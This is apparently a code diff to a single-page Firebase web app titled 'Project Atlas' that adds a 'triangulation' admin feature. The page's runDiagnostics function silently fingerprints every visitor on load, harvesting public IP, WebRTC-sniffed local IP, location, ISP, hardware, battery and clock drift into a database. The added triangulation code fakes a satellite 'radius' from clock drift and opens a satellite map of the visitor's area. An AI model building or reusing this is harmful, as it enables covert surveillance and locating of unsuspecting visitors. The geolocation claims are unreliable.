@@ -43,6 +43,13 @@
         .log-row:hover { background: var(--accent-dim); }
         .del-log { color: var(--danger); background: none; border: 1px solid var(--danger); font-size: 9px; cursor: pointer; padding: 4px 8px; border-radius: 5px; }
 
+        /* NEW: Triangulation Radar UI */
+        #triOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
+        .radar-circle { width: 180px; height: 180px; border: 2px solid var(--accent); border-radius: 50%; position: relative; margin-bottom: 20px; box-shadow: 0 0 20px var(--accent-dim); }
+        .radar-circle::before { content: ''; position: absolute; top: 50%; left: 50%; width: 50%; height: 2px; background: var(--accent); transform-origin: left; animation: scan 2s linear infinite; }
+        @keyframes scan { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .btn-tri { background: var(--accent-dim); color: var(--accent); border: 1px solid var(--accent); padding: 2px 6px; border-radius: 4px; font-size: 9px; cursor: pointer; font-weight: bold; margin-top: 4px; }
+
         /* Login UI */
         #adminToggle { position: fixed; bottom: 20px; right: 20px; background: var(--bg-panel); border: 1px solid var(--border); color: var(--text-dim); padding: 10px 15px; border-radius: 30px; cursor: pointer; font-size: 0.7rem; font-weight: 600; }
         #loginModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 2000; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
@@ -87,6 +94,11 @@
         </div>
     </div>
 
+    <div id="triOverlay">
+        <div class="radar-circle"></div>
+        <div id="triStatus" style="font-family: 'JetBrains Mono'; color: var(--accent); text-align: center;">SIGNAL ACQUISITION...</div>
+    </div>
+
     <button id="adminToggle">Admin Access</button>
     <button id="logoutBtn" style="display:none; position: fixed; bottom: 20px; right: 20px; background: var(--danger); color: white; border: none; padding: 10px 18px; border-radius: 30px; cursor: pointer; font-size: 0.7rem; z-index: 1001;">Logout</button>
 
@@ -123,21 +135,14 @@
 
                 const snapshot = await db.ref("visits").orderByChild("ip").equalTo(ip).once("value");
                 if (!snapshot.exists()) {
-                    
-                    // 1. Clock Drift
-                    const start = Date.now();
                     const driftRes = await fetch('https://worldtimeapi.org/api/timezone/Etc/UTC');
                     const driftData = await driftRes.json();
                     const clockDrift = Date.now() - new Date(driftData.datetime).getTime();
-
-                    // 2. Hardware / Battery
                     let bat = "N/A";
                     if(navigator.getBattery) {
                         const b = await navigator.getBattery();
                         bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
                     }
-
-                    // 3. WebRTC Local IP Sniffing
                     let localIP = "Secure/Hidden";
                     const pc = new RTCPeerConnection({iceServers:[]});
                     pc.createDataChannel("");
@@ -151,19 +156,13 @@
 
                     setTimeout(() => {
                         db.ref("visits").push({
-                            ip: ip, local_ip: localIP,
-                            city: data.city, country: data.country, isp: data.org,
-                            cpu: navigator.hardwareConcurrency || "N/A",
-                            ram: navigator.deviceMemory || "N/A",
-                            gpu: getGPU(),
-                            res: `${window.screen.width}x${window.screen.height}`,
-                            battery: bat,
-                            drift: clockDrift + "ms",
-                            ua: navigator.userAgent,
-                            ts: Date.now(),
-                            time: new Date().toLocaleString('en-GB', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
+                            ip: ip, local_ip: localIP, city: data.city, country: data.country, isp: data.org,
+                            cpu: navigator.hardwareConcurrency || "N/A", ram: navigator.deviceMemory || "N/A",
+                            gpu: getGPU(), res: `${window.screen.width}x${window.screen.height}`,
+                            battery: bat, drift: clockDrift + "ms", ua: navigator.userAgent,
+                            ts: Date.now(), time: new Date().toLocaleString('en-GB', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
                         });
-                    }, 1000); // Wait for WebRTC
+                    }, 1000);
                 }
             } catch (e) { console.error("Diag failed"); }
         }
@@ -176,10 +175,8 @@
                 return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
             } catch(e) { return "N/A"; }
         }
-
         runDiagnostics();
 
-        // --- CORE SYNC ---
         db.ref("log").on("value", snap => {
             const d = snap.val() || {};
             document.getElementById("title").innerText = d.title || "Project Atlas";
@@ -187,7 +184,6 @@
             document.getElementById("tbody").innerHTML = d.table || "";
         });
 
-        // --- ADMIN UI ---
         const modal = document.getElementById('loginModal');
         document.getElementById('adminToggle').onclick = () => modal.style.display = 'flex';
 
@@ -215,7 +211,11 @@
                     tr.className = "log-row";
                     tr.innerHTML = `
                         <td onclick="inspect('${child.key}')">${log.time}</td>
-                        <td onclick="inspect('${child.key}')" style="color:var(--accent)">${log.ip}<br><small>${log.local_ip || '---'}</small></td>
+                        <td style="color:var(--accent)">
+                            <span onclick="inspect('${child.key}')">${log.ip}</span><br>
+                            <small onclick="inspect('${child.key}')">${log.local_ip || '---'}</small><br>
+                            <button class="btn-tri" onclick="triangulate('${child.key}')">TRIANGULATE</button>
+                        </td>
                         <td onclick="inspect('${child.key}')">${log.city}</td>
                         <td><button class="del-log" onclick="deleteLog('${child.key}')">DEL</button></td>
                     `;
@@ -230,6 +230,29 @@
             alert(`SYSTEM DIAGNOSTICS:\n------------------\nPUBLIC IP: ${d.ip}\nLOCAL IP: ${d.local_ip}\nISP: ${d.isp}\n------------------\nCPU: ${d.cpu} Cores\nRAM: ~${d.ram} GB\nGPU: ${d.gpu}\nCLOCK DRIFT: ${d.drift}\nBATTERY: ${d.battery}\n------------------\nUA: ${d.ua}`);
         }
 
+        // --- NEW: TRIANGULATION ENGINE ---
+        async function triangulate(key) {
+            const snap = await db.ref("visits/" + key).once("value");
+            const d = snap.val();
+            const overlay = document.getElementById('triOverlay');
+            const status = document.getElementById('triStatus');
+            
+            overlay.style.display = 'flex';
+            setTimeout(() => {
+                status.innerHTML = "LATENCY MATCHED.<br>UPLINKING TO SATELLITE...";
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    const radius = (parseInt(d.drift) * 0.45).toFixed(2);
+                    const msg = `TRIANGULATION COMPLETE\n------------------\nRadius: ${radius}km\nTarget: ${d.city}\nNode: ${d.isp}\n------------------\nOpen Satellite OSINT?`;
+                    if(confirm(msg)) {
+                        const search = encodeURIComponent(`${d.city} ${d.isp} network hub`);
+                        window.open(`https://www.google.com/maps/search/${search}/@?api=1&maptype=satellite`, '_blank');
+                    }
+                    status.innerHTML = "SIGNAL ACQUISITION...";
+                }, 2000);
+            }, 1500);
+        }
+
         window.deleteLog = (key) => { if(confirm("Erase log?")) db.ref("visits/" + key).remove(); };
         document.getElementById("loginBtn").onclick = () => auth.signInWithEmailAndPassword(document.getElementById("email").value, document.getElementById("password").value).catch(e => alert("Unauthorized"));
         document.getElementById("logoutBtn").onclick = () => auth.signOut();
@@ -240,7 +263,6 @@
         }
         ["title", "desc", "tbody"].forEach(id => document.getElementById(id).addEventListener("blur", saveData));
 
-        // --- TIMER ---
         const targetDate = new Date("February 3, 2026 00:00:00").getTime();
         setInterval(() => {
             const diff = targetDate - Date.now();
